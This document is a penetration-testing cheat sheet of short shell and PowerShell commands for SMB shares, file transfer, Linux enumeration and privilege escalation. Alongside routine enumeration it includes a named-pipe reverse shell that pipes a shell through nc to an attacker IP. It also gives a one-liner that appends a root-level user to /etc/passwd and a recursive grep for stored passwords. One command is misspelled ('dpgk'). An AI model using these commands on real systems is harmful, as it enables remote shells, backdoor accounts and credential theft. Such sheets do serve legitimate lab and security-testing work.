
Mount a SMB share in the system

```shell
sudo mount -t cifs -o 'user=<USERNAME>' //<IP>/share /mnt/share
```

Print permissions over a SMB share for the folder Folder

```shell
smbcacls --no-pass //<IP>/share Folder
```

Make a SMB2 server with name test and credentials.

```shell
impacket-smbserver share .  -smb2support -user user -password password
```

The connection will be done from the Windows client using `\\IP\share` as share location and the credentials.

From the Windows Machine the volume can be mounted with

```powershell
net use H: \\<KALI-IP>\share password /user:user 
```

Transfer files with SSH using a single binary with [pscp](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```powershell
C:\Users\Public\pscp.exe FILE user@<IP>:C:\Users\Public
```

List all installed packages

```shell
dpgk -l
```

List all disks

```shell
lsblk
```

List all mounts

```shell
mount
```

List all kernel modules

```shell
lsmod
```

Gain information of a module

```shell
modinfo <MODULE>
```

View connections and listening ports

```shell
ss -anp
```

Find writable files in the system

```shell
find / -writable -type d 2>/dev/null
```

Find files with SUID in the system

```shell
find / -perm -u=s -type f 2>/dev/null
```

Add a TCPDUMP listener on lo interface

```shell
 sudo tcpdump -i lo -A | grep "searchword"
```

List sudoer capabilities for a given user

```shell
sudo -l
```

List all executed cronjobs

```shell
grep "CRON" /var/log/syslog
```

Generating a new user in /etc/passwd

```shell
openssl passwd <PASSWORD>
echo "<ROOT-USERNAME>:<PASSWORD-HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Get informations of a process

```shell
ps u -C <PROCESS-NAME>
cat /proc/<PID>/status
```

Named pipe revshell

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
```

Show git altered files in a git folder

```shell
git log -p
```

Show git diff of a commit

```shell
git diff-tree -p <COMMIT>
```

Recursive cat in a folder and grep for string "password"

```shell
find . -exec cat {} + | grep -i password
```

Download all the resources on a FTP server

```shell
wget -r --user="USERNAME" --password="PASSWORD" ftp://<IP>
```